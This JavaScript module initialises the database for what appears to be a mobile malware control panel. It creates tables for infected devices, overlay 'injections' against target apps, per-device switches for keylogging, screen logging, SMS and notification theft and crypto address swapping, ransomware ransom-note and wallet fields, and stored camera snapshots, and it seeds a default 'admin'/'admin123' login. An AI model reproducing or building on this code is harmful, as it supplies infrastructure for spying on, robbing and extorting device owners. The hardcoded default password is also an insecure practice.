import sqlite3 from 'sqlite3';
import { DB_PATH } from '../config.js';

let db;

export function initDB() {
  db = new sqlite3.Database(DB_PATH);
  db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS users (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      username TEXT UNIQUE NOT NULL,
      password TEXT NOT NULL,
      role TEXT DEFAULT 'admin',
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS devices (
      id TEXT PRIMARY KEY,
      name TEXT,
      model TEXT,
      os_version TEXT,
      battery INTEGER,
      ip TEXT,
      country TEXT,
      status TEXT DEFAULT 'offline',
      last_seen DATETIME,
      device_info TEXT,
      config TEXT,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS logs (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      device_id TEXT,
      type TEXT,
      data TEXT,
      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS injections (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      device_id TEXT,
      target_app TEXT,
      category TEXT,
      status TEXT DEFAULT 'pending',
      result TEXT,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS toolkit (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      device_id TEXT,
      keylogger INTEGER DEFAULT 0,
      screenlogger INTEGER DEFAULT 0,
      sms_logs INTEGER DEFAULT 0,
      crypto_swap INTEGER DEFAULT 0,
      show_notifications INTEGER DEFAULT 0,
      notification_logs INTEGER DEFAULT 0,
      ransomware_title TEXT,
      ransomware_body TEXT,
      ransomware_wallet TEXT,
      updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS snapshots (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      device_id TEXT,
      camera TEXT,
      image BLOB,
      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);

    // Default admin
    import('bcryptjs').then(bcrypt => {
      const hash = bcrypt.default.hashSync('admin123', 10);
      db.run(`INSERT OR IGNORE INTO users (username, password, role) VALUES (?, ?, ?)`, ['admin', hash, 'admin']);
    });
  });
  console.log('DB initialized');
}

export function getDB() {
  if (!db) initDB();
  return db;
}

export function updateDeviceStatus(id, status) {
  const d = getDB();
  d.run(`INSERT OR REPLACE INTO devices (id, status, last_seen) VALUES (?, ?, ?)`,
    [id, status, new Date().toISOString()]);
}
